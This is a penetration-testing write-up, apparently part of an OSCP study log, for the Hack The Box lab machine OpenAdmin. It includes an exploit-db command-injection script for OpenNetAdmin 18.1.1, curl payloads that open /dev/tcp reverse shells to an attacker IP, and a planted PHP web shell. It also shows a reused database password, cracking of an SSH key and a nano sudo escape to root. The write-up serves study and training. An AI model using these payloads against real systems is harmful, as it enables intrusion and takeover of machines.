---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/course-review/cyber-security-courses-journey/oscp-journey/ctf/hack-the-box/linux-boxes/openadmin-easy
---

# ✅ OpenAdmin (Easy)

## Lesson Learn

![](../../../../../../.gitbook/assets/Openadmin.PNG)

## Report-Penetration

**Vulnerable Exploit:** Curl Injection, OpenAdmin out of dated

**System Vulnerable:** 10.10.10.171

**Vulnerability Explanation:** By enumerating hidden directory, we found a login page which exposed application version that out of dated which contained vulnerable with command injection.

**Privilege Escalation Vulnerability:** Password reuse and misconfigure privilege of the application.

**Vulnerability Fix:** Update application version to the latest or stable. Ensure that there is no reuse password in used and least privilege.

**Severity:** High

**Step to Compromise the Host:**&#x20;

## Reconnaissance

```
└─$ nmap -p- -sC -sV -T4 10.10.10.171 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-04 03:01 EST
Nmap scan report for 10.10.10.171
Host is up (0.052s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

### Port 80 Apache/2.4.29

By going through port 80, there is a default webpage of apache

![](<../../../../../../.gitbook/assets/image (378).png>)

Start running gobuster to find hidden directory

```
└─$ gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50     
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.171
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/04 03:02:10 Starting gobuster in directory enumeration mode
===============================================================
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/] 
/server-status        (Status: 403) [Size: 277] 
```

Checking on **/music**

![](<../../../../../../.gitbook/assets/image (727).png>)

On login button, there is href to **/10.10.10.171/ona**

<figure><img src="../../../../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

There is version **18.1.1.** Let search for public exploit

![](<../../../../../../.gitbook/assets/image (563).png>)

## Exploitation

Proof of Concept Code: [https://www.exploit-db.com/exploits/47691](https://www.exploit-db.com/exploits/47691)

```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Trying manual exploit with curl command

```
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://10.10.10.171/ona                                   130 ⨯
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.10.171/ona/">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at 10.10.10.171 Port 80</address>
</body></html>
```

Again, add / and the end **http://10.10.10.171/ona/**

{% code overflow="wrap" %}
```
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;id&xajaxargs[]=ping" http://10.10.10.171/ona/
```
{% endcode %}

It's a lot of information. Let search for user www-data, we found

![](<../../../../../../.gitbook/assets/image (888).png>)

Now we can modify the script to ease of view the output

{% code overflow="wrap" %}
```
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";id;echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
{% endcode %}

Confirms that we can execute command.

Let start netcat listener on port 4444

```
nc -lvp 4444
```

{% code overflow="wrap" %}
```
└─$ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";bash -c 'bash -i >%26 /dev/tcp/10.10.14.7/4444 0>%261';echo \"END\"&xajaxargs[]=ping" http://10.10.10.171/ona/ | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
```
{% endcode %}

![](<../../../../../../.gitbook/assets/image (313).png>)

## Privilege Escalation

### Shell as jimmy

By enumerate on the machine, we found a database file which stored password of user jimmy

```
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

We have checked password reuse and it's worked on user jimmy

```
www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:/opt/ona/www/local/config$ whoami
jimmy
```

### Shell as joanna

Checking on /var/www, we found /internal own by user jimmy

```
jimmy@openadmin:/var/www$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Nov 22  2019 .
drwxr-xr-x 14 root     root     4096 Nov 21  2019 ..
drwxr-xr-x  6 www-data www-data 4096 Nov 22  2019 html
drwxrwx---  2 jimmy    internal 4096 Nov 23  2019 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21  2019 ona -> /opt/ona/www
```

We found there is a localhost listening on port 52846

```
//jimmy@openadmin:/var/www/internal$ netstat -tnpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

This directory could be other web server

```
jimmy@openadmin:/var/www/internal$ ls -la
total 20
drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
```

Let check with the curl command on port 52846

### Crack private key

```
jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

Let try to crack the private key with the hint of "ninja"

```
└─$ /usr/share/john/ssh2john.py id_rsa > hash.txt

└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
1g 0:00:00:06 DONE (2021-12-04 10:23) 0.1605g/s 2302Kp/s 2302Kc/s 2302KC/s *7¡Vamos!
Session completed
```

```
└─$ chmod 600 id_rsa                         
```

![](<../../../../../../.gitbook/assets/image (551).png>)

We can write an unencrypted copy of the key

```
└─$ openssl rsa -in id_rsa -out id_rsa_joanna                                                                                                                                           255 ⨯
Enter pass phrase for id_rsa:
writing RSA key

└─$ ssh -i id_rsa_joanna joanna@10.10.10.171
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  4 15:27:50 UTC 2021

  System load:  0.0               Processes:             177
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ exit
logout
Connection to 10.10.10.171 closed.
```

### Port Forwarding

```
└─$ ssh -L 52846:localhost:52846 jimmy@10.10.10.171                     
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Dec  4 15:45:30 UTC 2021

  System load:  0.0               Processes:             169
  Usage of /:   30.9% of 7.81GB   Users logged in:       0
  Memory usage: 9%                IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$ 
```

```
└─$ netstat -tplun                       
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      2334/ssh            
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:52846               :::*                    LISTEN      2334/ssh            
udp        0      0 0.0.0.0:54988           0.0.0.0:*                           -   
```

![](<../../../../../../.gitbook/assets/image (350).png>)

Create a php command execute script on /var/www/internal

```
jimmy@openadmin:/var/www/internal$ cat shell.php
<?php system($_REQEUST[cmd]); ?>
```

Confirms that we can remote execute arbitrary command

```
└─$ curl 127.0.0.1:52846/shell.php?cmd=id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)

└─$ curl 127.0.0.1:52846/shell.php?cmd=whoami
joanna

```

{% code overflow="wrap" %}
```
└─$ curl http://127.0.0.1:52846/shell.php?cmd='bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.7/5555%200%3E%261%27'
```
{% endcode %}

![](<../../../../../../.gitbook/assets/image (395).png>)

### Shell as Root

Check misconfigure on sudo -l

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

### /opt/priv sudo -l

Nothing on **/opt/priv.** [**https://gtfobins.github.io/gtfobins/nano/#sudo**](https://gtfobins.github.io/gtfobins/nano/#sudo)

```
sudo /bin/nano
Ctrl+r
Ctrl+x
reset; /bin/bash 1>&0 2>&0
enter
```

![](<../../../../../../.gitbook/assets/image (868).png>)
